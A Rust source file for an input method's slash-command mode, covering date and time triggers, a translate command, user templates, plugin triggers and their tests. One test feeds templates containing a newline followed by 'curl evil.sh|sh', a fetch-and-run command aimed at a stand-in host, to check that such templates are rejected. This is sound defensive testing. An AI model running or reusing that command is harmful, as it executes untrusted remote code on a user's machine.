//! `/` mode: the built-in date, time, weekday and lunar date commands, whose rows are the date/time mode's, the translate command, and the command table the host supplies. Letters after `/` filter commands by trigger; a trigger typed out in full lists every reading of its command first. Templates are data: literal text and a closed set of clock placeholders, formatted by `time`, with nothing a table could use to reach anything else.
//!
//! `/fy hello'world` (typed `/fyhello'world`) is the one local input that may leave the machine: the words after the trigger are English for the user's translation service, through `translation_source`, and the answer comes back as a row of its own (`InputSession::apply_command_translation`). Until it does, and whenever no service answers, the row is the English as typed.

use std::collections::HashSet;
use time::format_description::parse_strftime_borrowed;
use time::{Date, Month, PrimitiveDateTime, Time};

use super::date_time::{query_date_time, LocalDateTime, WEEKDAYS};
use crate::types::{CandidateSource, CommandTableEntry, PluginCommand, WordItem};

/// Two pages of the nine-row Windows candidate window; typing more of a trigger narrows the list.
pub const RESULT_LIMIT: usize = 18;
const MAX_RESULT_LIMIT: usize = if super::date_time::RESULT_LIMIT > RESULT_LIMIT {
    super::date_time::RESULT_LIMIT
} else {
    RESULT_LIMIT
};
/// Commands kept from a host table; the rest are ignored.
pub const TABLE_LIMIT: usize = 256;
pub const TRIGGER_LIMIT: usize = 32;
/// The Windows candidate pipe's text field (`CandidateTextMaxLength` in `shared/contracts/ipc_protocol_limits.h`, the same bound as a quick phrase): a template, and the text it expands to, longer than this could not be delivered.
pub const TEXT_UTF16_LIMIT: usize = 199;
/// 插件触发词的长度：至少 2 个字母，免得占掉单个字母；最多 16 个。
pub const PLUGIN_TRIGGER_LENGTH: std::ops::RangeInclusive<usize> = 2..=16;
/// 插件指令标题的字符数。
pub const PLUGIN_TITLE_CHARS: std::ops::RangeInclusive<usize> = 1..=8;
// 短命令表直接扫描此前的触发词，避免为常见小表创建哈希状态。
const SMALL_COMMAND_TABLE: usize = 64;

const DEFAULT_DATE_FORMAT: &str = "%Y-%m-%d";
const DEFAULT_TIME_FORMAT: &str = "%H:%M";

/// The built-in commands: the date/time mode's keywords, the translate command, and the title shown beside their rows.
const BUILTINS: [(&[&str], &str); 5] = [
    (&["rq", "riqi", "date"], "日期"),
    (&["sj", "shijian", "time"], "时间"),
    (&["xq", "xingqi", "week"], "星期"),
    (&["nl", "nongli", "yinli"], "农历"),
    (TRANSLATE_TRIGGERS, "翻译"),
];

/// The translate command's triggers, longest first so `fanyi` is not read as `f` followed by text.
const TRANSLATE_TRIGGERS: &[&str] = &["translate", "fanyi", "fy"];

/// The English after a translate trigger, words split at `'` and joined by spaces, with the trigger that introduced it; `None` for any other input, for a trigger with nothing after it, and for input a table trigger begins with, which the user may still be typing as their own command. `table` must have gone through `usable_command_table`.
pub fn translation_source(
    code: &str,
    table: &[CommandTableEntry],
) -> Option<(&'static str, String)> {
    if table.iter().any(|entry| entry.trigger.starts_with(code)) {
        return None;
    }
    let trigger = TRANSLATE_TRIGGERS
        .iter()
        .find(|trigger| code.starts_with(**trigger))?;
    let rest = &code[trigger.len()..];
    if !rest
        .bytes()
        .all(|byte| byte.is_ascii_lowercase() || byte == b'\'')
    {
        return None;
    }
    let text = join_translation_words(rest);
    (!text.is_empty()).then_some((trigger, text))
}

fn join_translation_words(rest: &str) -> String {
    let mut text = String::with_capacity(rest.len());
    let mut separator = false;
    for byte in rest.bytes() {
        if byte == b'\'' {
            separator = !text.is_empty();
        } else {
            if separator {
                text.push(' ');
                separator = false;
            }
            text.push(char::from(byte));
        }
    }
    text
}

/// Whether a translate command is being typed, so `'` separates its words rather than ending the mode.
pub fn takes_word_separator(code: &str) -> bool {
    TRANSLATE_TRIGGERS
        .iter()
        .any(|trigger| code.len() > trigger.len() && code.starts_with(trigger))
        && code.ends_with(|letter: char| letter.is_ascii_lowercase())
}

/// The rows that are usable of a host table: valid triggers and templates, the first command of a trigger, at most `TABLE_LIMIT`.
pub fn usable_command_table(table: &[CommandTableEntry]) -> Vec<CommandTableEntry> {
    let mut usable = Vec::new();
    if table.len() <= SMALL_COMMAND_TABLE {
        for (index, entry) in table.iter().enumerate() {
            if usable.len() == TABLE_LIMIT {
                break;
            }
            if valid_trigger(&entry.trigger)
                && trigger_is_new(table, index, &entry.trigger)
                && fits(&entry.template)
                && template_valid(&entry.template)
            {
                if usable.capacity() == 0 {
                    usable.reserve_exact(TABLE_LIMIT.min(table.len()));
                }
                usable.push(entry.clone());
            }
        }
        return usable;
    }
    let mut triggers = HashSet::new();
    for entry in table {
        if usable.len() == TABLE_LIMIT {
            break;
        }
        let trigger_valid = valid_trigger(&entry.trigger);
        if trigger_valid {
            if triggers.capacity() == 0 {
                triggers.reserve(TABLE_LIMIT.min(table.len()));
            }
            if triggers.insert(entry.trigger.as_str())
                && fits(&entry.template)
                && template_valid(&entry.template)
            {
                if usable.capacity() == 0 {
                    usable.reserve_exact(TABLE_LIMIT.min(table.len()));
                }
                usable.push(entry.clone());
            }
        }
    }
    usable
}

fn valid_trigger(trigger: &str) -> bool {
    (1..=TRIGGER_LIMIT).contains(&trigger.len())
        && trigger.bytes().all(|byte| byte.is_ascii_lowercase())
}

fn trigger_is_new(table: &[CommandTableEntry], index: usize, trigger: &str) -> bool {
    table[..index]
        .iter()
        .all(|entry| !valid_trigger(&entry.trigger) || entry.trigger != trigger)
}

/// `/` 后字母匹配的命令行，权重按顺序递减；日期完整命令保留全部格式，其他命令最多 `RESULT_LIMIT` 行。精确匹配在前，用户表在内置命令前，`pinyin` 保存触发词；`table` 必须先经过 `usable_command_table`。
pub fn query_command(
    code: &str,
    now: &LocalDateTime,
    table: &[CommandTableEntry],
) -> Vec<WordItem> {
    let clock = clock(now);
    let limit = if BUILTINS[0].0.contains(&code) {
        MAX_RESULT_LIMIT
    } else {
        RESULT_LIMIT
    };
    let mut rows: [Option<(String, String)>; MAX_RESULT_LIMIT] = std::array::from_fn(|_| None);
    let mut row_count = 0;
    let mut push = |trigger: &str, text: String| {
        // 有界列表直接扫描，避免每次按键为去重再复制一份文本集合。
        if row_count < limit
            && fits(&text)
            && !rows[..row_count]
                .iter()
                .flatten()
                .any(|(_, existing)| existing == &text)
        {
            rows[row_count] = Some((trigger.to_owned(), text));
            row_count += 1;
        }
    };
    if let Some((trigger, text)) = translation_source(code, table) {
        push(trigger, text);
    }
    for exact in [true, false] {
        for entry in table {
            if (entry.trigger == code) == exact && entry.trigger.starts_with(code) {
                if let Some(text) = expand(&entry.template, clock.as_ref()) {
                    push(&entry.trigger, text);
                }
            }
        }
        for (aliases, _) in BUILTINS {
            if exact {
                if aliases.contains(&code) {
                    for row in query_date_time(code, now) {
                        push(code, row.word);
                    }
                }
            } else if !aliases.contains(&code) {
                if let Some(alias) = aliases.iter().find(|alias| alias.starts_with(code)) {
                    if let Some(row) = query_date_time(alias, now).into_iter().next() {
                        push(alias, row.word);
                    }
                }
            }
        }
    }
    rows.into_iter()
        .take(row_count)
        .flatten()
        .enumerate()
        .map(|(index, (trigger, text))| {
            WordItem::new(
                trigger,
                text,
                (row_count - index) as i64,
                CandidateSource::Generated,
                "",
            )
        })
        .collect()
}

/// The title shown beside a row of `trigger`.
pub fn command_title<'a>(trigger: &str, table: &'a [CommandTableEntry]) -> Option<&'a str> {
    if let Some(entry) = table.iter().find(|entry| entry.trigger == trigger) {
        return Some(&entry.title);
    }
    BUILTINS
        .iter()
        .find(|(aliases, _)| aliases.contains(&trigger))
        .map(|(_, title)| *title)
}

/// 内置指令的全部触发词（日期、时间、星期、农历和翻译）。插件触发词不能等于它们，也不能和它们互为前缀；client-services 校验插件清单时复制了一份，由一致性测试守着。
pub fn builtin_triggers() -> impl Iterator<Item = &'static str> {
    BUILTINS
        .iter()
        .flat_map(|(aliases, _)| aliases.iter().copied())
}

/// 内置指令的标题，同 [`builtin_triggers`] 一样由 client-services 复制一份。
pub fn builtin_titles() -> impl Iterator<Item = &'static str> {
    BUILTINS.iter().map(|(_, title)| *title)
}

/// 两个触发词相等或一个是另一个的前缀：用户打着其中一个时，分不清是在打哪一个。
fn triggers_overlap(left: &str, right: &str) -> bool {
    left.starts_with(right) || right.starts_with(left)
}

fn valid_plugin_trigger(trigger: &str) -> bool {
    PLUGIN_TRIGGER_LENGTH.contains(&trigger.len())
        && trigger.bytes().all(|byte| byte.is_ascii_lowercase())
}

fn valid_plugin_title(title: &str) -> bool {
    PLUGIN_TITLE_CHARS.contains(&title.chars().count())
        && !title.chars().any(char::is_control)
        && title.trim() == title
}

/// 宿主交来的插件指令里引擎能用的那些，按原顺序：触发词是 2 到 16 个小写字母、标题是 1 到 8 个字符（不含控制字符，首尾不是空白），并且触发词不等于、也不和任何内置触发词、用户指令表的触发词、排在前面的插件触发词互为前缀。用户的指令表永远赢，插件之间先到先得。过滤之后任何两个生效的触发词都没有前缀关系，所以一段输入至多匹配一个。client-services 算有效触发词时，触发词用同一套规则；标题以这里为下限（只拒控制字符和首尾空白），client-services 可以更严。触发词重复时只留第一条合规的，它的标题就是行旁显示的标题（`CandidateQueries::plugin_command_title`）。`table` 必须先经过 `usable_command_table`。
pub fn usable_plugin_commands(
    table: &[CommandTableEntry],
    plugin: &[PluginCommand],
) -> Vec<PluginCommand> {
    let mut usable: Vec<PluginCommand> = Vec::new();
    for command in plugin {
        let trigger = command.trigger.as_str();
        if valid_plugin_trigger(trigger)
            && valid_plugin_title(&command.title)
            && !builtin_triggers().any(|builtin| triggers_overlap(trigger, builtin))
            && !table
                .iter()
                .any(|entry| triggers_overlap(trigger, &entry.trigger))
            && !usable
                .iter()
                .any(|earlier| triggers_overlap(trigger, &earlier.trigger))
        {
            usable.push(command.clone());
        }
    }
    usable
}

/// `/` 之后的输入以某个插件触发词开头、剩下的全是小写字母时，返回（触发词，参数），参数可以为空（`/uuid`）。`plugin` 必须先经过 [`usable_plugin_commands`]，所以至多一个匹配，不需要最长匹配。
pub fn plugin_command_source<'a, 'b>(
    code: &'b str,
    plugin: &'a [PluginCommand],
) -> Option<(&'a str, &'b str)> {
    let command = plugin
        .iter()
        .find(|command| code.starts_with(command.trigger.as_str()))?;
    let argument = &code[command.trigger.len()..];
    argument
        .bytes()
        .all(|byte| byte.is_ascii_lowercase())
        .then_some((command.trigger.as_str(), argument))
}

fn fits(text: &str) -> bool {
    text.encode_utf16().count() <= TEXT_UTF16_LIMIT
}

/// The wall clock as a `time` value, `None` for the zero clock a failed read leaves behind.
fn clock(now: &LocalDateTime) -> Option<PrimitiveDateTime> {
    let month = Month::try_from(u8::try_from(now.month).ok()?).ok()?;
    let date = Date::from_calendar_date(now.year, month, u8::try_from(now.day).ok()?).ok()?;
    let time = Time::from_hms(
        u8::try_from(now.hour).ok()?,
        u8::try_from(now.minute).ok()?,
        u8::try_from(now.second).ok()?,
    )
    .ok()?;
    Some(PrimitiveDateTime::new(date, time))
}

/// Whether every placeholder of the template is one `expand` knows, checked by expanding it against a fixed instant.
fn template_valid(template: &str) -> bool {
    expand(template, Some(&PrimitiveDateTime::MIN)).is_some()
}

/// The template with its placeholders replaced; `None` for a malformed template, for one that needs the clock when there is none, or for text with a control character. A candidate row shows one line, so a newline or tab (literal, or `%n`/`%t` in a format) would reach the application unseen: a line break in a terminal runs whatever follows it.
fn expand(template: &str, clock: Option<&PrimitiveDateTime>) -> Option<String> {
    let mut output = String::with_capacity(template.len());
    let mut rest = template;
    while let Some(open) = rest.find(['{', '}']) {
        if rest.as_bytes()[open] == b'}' {
            return None;
        }
        output.push_str(&rest[..open]);
        let after = &rest[open + 1..];
        let close = after.find(['{', '}'])?;
        if after.as_bytes()[close] == b'{' {
            return None;
        }
        let placeholder = &after[..close];
        rest = &after[close + 1..];
        if placeholder == "weekday" {
            let clock = clock?;
            output.push_str(WEEKDAYS[usize::from(clock.weekday().number_days_from_sunday())]);
            continue;
        }
        let (name, format) = placeholder.split_once(':').unwrap_or((placeholder, ""));
        let format = match (name, format) {
            ("date", "") => DEFAULT_DATE_FORMAT,
            ("time", "") => DEFAULT_TIME_FORMAT,
            ("date" | "time", format) => format,
            _ => return None,
        };
        let items = parse_strftime_borrowed(format).ok()?;
        output.push_str(&clock?.format(&items).ok()?);
    }
    output.push_str(rest);
    (!output.chars().any(char::is_control)).then_some(output)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn now() -> LocalDateTime {
        LocalDateTime {
            year: 2026,
            month: 10,
            day: 1,
            weekday: 4,
            hour: 9,
            minute: 5,
            second: 7,
        }
    }

    fn entry(trigger: &str, title: &str, template: &str) -> CommandTableEntry {
        CommandTableEntry {
            trigger: trigger.to_owned(),
            title: title.to_owned(),
            template: template.to_owned(),
        }
    }

    fn words(rows: &[WordItem]) -> Vec<&str> {
        rows.iter().map(|row| row.word.as_str()).collect()
    }

    #[test]
    fn an_unknown_command_does_not_allocate_a_row_buffer() {
        let (rows, allocations) =
            crate::ime::personal_rerank::allocations::count(|| query_command("zzzz", &now(), &[]));
        assert!(rows.is_empty());
        assert_eq!(allocations, 0);
    }

    #[test]
    fn a_bare_slash_lists_one_reading_of_every_command() {
        let table = usable_command_table(&[entry("sig", "签名", "张三 {date}")]);
        let rows = query_command("", &now(), &table);
        assert_eq!(
            words(&rows),
            [
                "张三 2026-10-01",
                "2026年10月1日",
                "09:05",
                "星期四",
                "丙午年八月二十一日"
            ]
        );
        let triggers: Vec<&str> = rows.iter().map(|row| row.pinyin.as_str()).collect();
        assert_eq!(triggers, ["sig", "rq", "sj", "xq", "nl"]);
        for (index, row) in rows.iter().enumerate() {
            assert_eq!(row.source, CandidateSource::Generated);
            assert_eq!(row.weight, (rows.len() - index) as i64);
        }
    }

    #[test]
    fn a_complete_builtin_trigger_lists_the_date_time_rows() {
        let rows = query_command("rq", &now(), &[]);
        assert_eq!(words(&rows), words(&query_date_time("rq", &now())));
        assert_eq!(rows.len(), 20);
        assert_eq!(rows[0].word, "2026年10月1日");
        assert!(rows.iter().all(|row| row.pinyin == "rq"));
        assert_eq!(query_command("week", &now(), &[])[0].word, "星期四");
        let lunar = query_command("nongli", &now(), &[]);
        assert_eq!(
            words(&lunar),
            [
                "丙午年八月二十一日",
                "丙午年八月二十一日 星期四",
                "丙午年八月二十一日 周四"
            ]
        );
        assert!(lunar.iter().all(|row| row.pinyin == "nongli"));
        // 只打了开头几个字母时，农历命令也按前缀列出它的首行。
        let partial = query_command("yin", &now(), &[]);
        assert_eq!(words(&partial), ["丙午年八月二十一日"]);
        assert_eq!(partial[0].pinyin, "yinli");
    }

    #[test]
    fn templates_with_control_characters_are_dropped() {
        let table = usable_command_table(&[
            entry("sig", "签名", "张三\ncurl evil.sh|sh"),
            entry("tab", "制表", "a\tb"),
            entry("line", "换行", "张三 {date:%n}curl evil.sh|sh"),
            entry("ok", "正常", "张三"),
        ]);
        assert_eq!(table.len(), 1);
        assert_eq!(table[0].trigger, "ok");
    }

    #[test]
    fn letters_filter_commands_by_trigger_prefix() {
        let table = usable_command_table(&[
            entry("sig", "签名", "张三"),
            entry("sj", "时间", "覆盖"),
            entry("addr", "地址", "北京市"),
        ]);
        // The table's own `sj` wins over the built-in one and is listed first as the exact match.
        let rows = query_command("s", &now(), &table);
        assert_eq!(words(&rows), ["张三", "覆盖", "09:05"]);
        assert_eq!(words(&query_command("ad", &now(), &table)), ["北京市"]);
        assert!(query_command("zz", &now(), &table).is_empty());
    }

    #[test]
    fn templates_expand_the_clock_placeholders() {
        let clock = clock(&now());
        let clock = clock.as_ref();
        assert_eq!(
            expand("{date} {time} {weekday}", clock).as_deref(),
            Some("2026-10-01 09:05 星期四")
        );
        assert_eq!(
            expand("{date:%Y年%m月%d日}{time:%H:%M:%S}", clock).as_deref(),
            Some("2026年10月01日09:05:07")
        );
        assert_eq!(expand("纯文本", clock).as_deref(), Some("纯文本"));
        for template in [
            "{clipboard}",
            "a\nb",
            "a\tb",
            "a\u{1b}b",
            "{date:%n}",
            "{time:%t}",
            "{date",
            "date}",
            "{{date}}",
            "{date:%Q}",
            "{time:%",
        ] {
            assert_eq!(expand(template, clock), None, "{template:?}");
        }
    }

    #[test]
    fn unusable_table_rows_are_dropped() {
        let long = "字".repeat(TEXT_UTF16_LIMIT + 1);
        let table = usable_command_table(&[
            entry("", "空", "x"),
            entry("Sig", "大写", "x"),
            entry("s1", "数字", "x"),
            entry(&"a".repeat(TRIGGER_LIMIT + 1), "太长", "x"),
            entry("bad", "占位符", "{clipboard}"),
            entry("big", "太长", &long),
            entry("ok", "第一", "一"),
            entry("ok", "第二", "二"),
        ]);
        assert_eq!(table, [entry("ok", "第一", "一")]);
        let many: Vec<CommandTableEntry> = (0..TABLE_LIMIT + 10)
            .map(|index| {
                let trigger: String = format!("{index:04}")
                    .bytes()
                    .map(|digit| char::from(b'a' + digit - b'0'))
                    .collect();
                entry(&trigger, "t", "x")
            })
            .collect();
        assert_eq!(usable_command_table(&many).len(), TABLE_LIMIT);
    }

    #[test]
    fn usable_command_table_reserves_the_input_bound() {
        let table = [
            entry("a", "甲", "一"),
            entry("b", "乙", "二"),
            entry("c", "丙", "三"),
        ];
        assert_eq!(usable_command_table(&table).capacity(), table.len());
    }

    #[test]
    fn all_invalid_command_rows_do_not_allocate_filter_state() {
        let table: Vec<_> = (0..=SMALL_COMMAND_TABLE)
            .map(|index| entry(&format!("Bad{index}"), "无效触发词", "文本"))
            .collect();
        let (usable, allocations) =
            crate::ime::personal_rerank::allocations::count(|| usable_command_table(&table));
        assert!(usable.is_empty());
        assert_eq!(allocations, 0);
    }

    #[test]
    fn short_command_table_trigger_scan_uses_no_temporary_heap_state() {
        let table = vec![
            entry("a", "无效模板", "{clipboard}"),
            entry("b", "乙", "二"),
            entry("c", "丙", "三"),
        ];
        let (is_new, allocations) =
            crate::ime::personal_rerank::allocations::count(|| trigger_is_new(&table, 2, "c"));
        assert!(is_new);
        assert_eq!(allocations, 0);
    }

    #[test]
    fn short_command_table_trigger_scan_keeps_invalid_templates_seen() {
        let table = [
            entry("dup", "无效模板", "{clipboard}"),
            entry("dup", "有效", "二"),
        ];
        assert!(!trigger_is_new(&table, 1, "dup"));
        assert_eq!(
            usable_command_table(&table),
            Vec::<CommandTableEntry>::new()
        );
    }

    #[test]
    fn a_command_needing_an_unreadable_clock_is_not_shown() {
        let table =
            usable_command_table(&[entry("d", "日期", "{date}"), entry("t", "文本", "文本")]);
        let rows = query_command("", &LocalDateTime::default(), &table);
        assert_eq!(rows[0].word, "文本");
        // The built-in rows read the zero clock the way the date/time mode always has.
        assert!(rows.iter().all(|row| row.pinyin != "d"), "{rows:?}");
    }

    #[test]
    fn titles_come_from_the_table_then_the_builtins() {
        let table = [entry("sig", "签名", "x")];
        assert_eq!(command_title("sig", &table), Some("签名"));
        assert_eq!(command_title("riqi", &table), Some("日期"));
        assert_eq!(command_title("nl", &table), Some("农历"));
        assert_eq!(command_title("fanyi", &table), Some("翻译"));
        assert_eq!(command_title("nope", &table), None);
    }

    #[test]
    fn the_translate_command_reads_english_after_its_trigger() {
        let source = |code| translation_source(code, &[]);
        assert_eq!(source("fyhello"), Some(("fy", "hello".to_owned())));
        assert_eq!(
            source("fy'hello''world'"),
            Some(("fy", "hello world".to_owned()))
        );
        assert_eq!(source("fanyigood"), Some(("fanyi", "good".to_owned())));
        assert_eq!(
            source("translatecat"),
            Some(("translate", "cat".to_owned()))
        );
        for code in ["", "f", "fy", "fy'", "fanyi", "translate", "rqx", "hello"] {
            assert_eq!(source(code), None, "{code:?}");
        }
        // A table trigger the input begins is the user's own command, not text to send anywhere.
        let table = usable_command_table(&[entry("fyz", "自定义", "x")]);
        assert_eq!(translation_source("fyz", &table), None);
        assert_eq!(translation_source("fy", &table), None);
        assert_eq!(
            translation_source("fyx", &table),
            Some(("fy", "x".to_owned()))
        );

        assert!(takes_word_separator("fyhello"));
        assert!(!takes_word_separator("fy"));
        assert!(!takes_word_separator("fyhello'"));
        assert!(!takes_word_separator("rqx"));
    }

    #[test]
    fn the_translate_command_shows_the_english_until_a_translation_arrives() {
        let rows = query_command("fyhello'world", &now(), &[]);
        assert_eq!(words(&rows), ["hello world"]);
        assert_eq!(rows[0].pinyin, "fy");
        assert_eq!(rows[0].source, CandidateSource::Generated);
        // The bare trigger and the bare `/` have no reading to show for it.
        assert!(query_command("fy", &now(), &[]).is_empty());
        assert!(query_command("", &now(), &[])
            .iter()
            .all(|row| !TRANSLATE_TRIGGERS.contains(&row.pinyin.as_str())));
    }

    #[test]
    fn translation_words_join_without_empty_segments() {
        assert_eq!(join_translation_words("'hello''world'"), "hello world");
    }

    fn plugin(trigger: &str, title: &str) -> PluginCommand {
        PluginCommand {
            trigger: trigger.to_owned(),
            title: title.to_owned(),
        }
    }

    fn triggers(commands: &[PluginCommand]) -> Vec<&str> {
        commands
            .iter()
            .map(|command| command.trigger.as_str())
            .collect()
    }

    #[test]
    fn builtin_triggers_and_titles_list_every_command() {
        let all: Vec<&str> = builtin_triggers().collect();
        assert_eq!(
            all,
            [
                "rq",
                "riqi",
                "date",
                "sj",
                "shijian",
                "time",
                "xq",
                "xingqi",
                "week",
                "nl",
                "nongli",
                "yinli",
                "translate",
                "fanyi",
                "fy"
            ]
        );
        let titles: Vec<&str> = builtin_titles().collect();
        assert_eq!(titles, ["日期", "时间", "星期", "农历", "翻译"]);
    }

    #[test]
    fn plugin_triggers_must_not_overlap_builtins_the_table_or_earlier_plugins() {
        let table = usable_command_table(&[entry("uu", "我的", "x"), entry("sig", "签名", "x")]);
        let usable = usable_plugin_commands(
            &table,
            &[
                // 和内置触发词相等、内置是它的前缀、它是内置的前缀。
                plugin("rq", "日期二"),
                plugin("fyx", "翻译二"),
                plugin("tim", "时间二"),
                // 和用户指令表相等或互为前缀。
                plugin("uuid", "UUID"),
                plugin("si", "签"),
                plugin("sig", "签名二"),
                // 插件之间：先到先得，相等和互为前缀的后来者都丢掉。
                plugin("cz", "拆字"),
                plugin("czh", "拆字二"),
                plugin("c", "单字母"),
                plugin("cz", "重复"),
                plugin("guid", "GUID"),
                plugin("gu", "前缀"),
                // 触发词不合规：太短、太长、大写、数字。
                plugin("a", "短"),
                plugin(&"q".repeat(17), "长"),
                plugin("Abc", "大写"),
                plugin("ab1", "数字"),
                // 标题不合规：空、9 个字符、控制字符、首尾空白。
                plugin("ka", ""),
                plugin("kb", "一二三四五六七八九"),
                plugin("kc", "a\nb"),
                plugin("kd", " 空白"),
                // 合规的边界：16 个字母、8 个字符。
                plugin(&"p".repeat(16), "一二三四五六七八"),
            ],
        );
        let sixteen = "p".repeat(16);
        assert_eq!(triggers(&usable), ["cz", "guid", sixteen.as_str()]);
        assert_eq!(usable[0].title, "拆字");
    }

    #[test]
    fn plugin_commands_match_a_trigger_followed_by_letters() {
        let usable = usable_plugin_commands(&[], &[plugin("uuid", "UUID"), plugin("cz", "拆字")]);
        assert_eq!(plugin_command_source("uuid", &usable), Some(("uuid", "")));
        assert_eq!(
            plugin_command_source("czhuohuo", &usable),
            Some(("cz", "huohuo"))
        );
        for code in ["", "u", "uui", "c", "zz", "czhuo'huo"] {
            assert_eq!(plugin_command_source(code, &usable), None, "{code:?}");
        }
        assert_eq!(plugin_command_source("uuid", &[]), None);
    }
}
